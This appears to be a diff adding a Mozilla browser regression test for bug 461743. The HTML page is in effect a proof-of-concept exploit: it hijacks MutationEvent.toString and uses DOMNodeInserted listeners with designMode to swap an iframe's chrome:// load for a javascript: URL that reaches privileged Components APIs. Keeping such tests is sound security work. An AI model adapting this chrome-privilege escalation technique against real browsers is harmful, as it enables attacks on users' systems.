@@ -1,0 +1,56 @@
+<!-- Testcase originally by <moz_bug_r_a4@yahoo.com> -->
+
+<!DOCTYPE html>
+<title>Test for bug 461743</title>
+
+<body>
+<iframe src="data:text/html;charset=utf-8,empty"></iframe>
+<iframe></iframe>
+
+<script type="application/javascript">
+  var chromeUrl = "chrome://global/content/mozilla.html";
+  var exploitUrl = "javascript:try { document.body.innerHTML = Components.utils.reportError; } catch (ex) { }";
+
+  var loadCount = 0;
+  frames[0].addEventListener("DOMContentLoaded", handleLoad);
+  frames[1].addEventListener("DOMContentLoaded", handleLoad);
+  function handleLoad() {
+    if (++loadCount < 2)
+      return;
+    frames[0].removeEventListener("DOMContentLoaded", handleLoad);
+    frames[1].removeEventListener("DOMContentLoaded", handleLoad);
+
+    var flip = 0;
+    MutationEvent.prototype.toString = function() {
+      return flip++ == 0 ? chromeUrl : exploitUrl;
+    };
+
+    var href = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(frames[1].location), "href").get;
+    var loadChrome = { handleEvent: href };
+    var loadExploit = { handleEvent: href };
+
+    function delay() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", location.href, false);
+      xhr.send(null);
+    }
+    function done() {
+      var event = new MessageEvent("461743", { bubbles: true, cancelable: false,
+                                               data: "done", origin: location.href,
+                                               source: window });
+      document.dispatchEvent(event);
+      frames[0].document.removeEventListener("DOMNodeInserted", loadChrome, true);
+      frames[0].document.removeEventListener("DOMNodeInserted", delay, true);
+      frames[0].document.removeEventListener("DOMNodeInserted", loadExploit, true);
+      frames[0].document.removeEventListener("DOMNodeInserted", done, true);
+    }
+
+    frames[0].document.addEventListener("DOMNodeInserted", loadChrome, true);
+    frames[0].document.addEventListener("DOMNodeInserted", delay, true);
+    frames[0].document.addEventListener("DOMNodeInserted", loadExploit, true);
+    frames[0].document.addEventListener("DOMNodeInserted", done, true);
+
+    frames[0].document.designMode = "on";
+  }
+</script>
+</body>
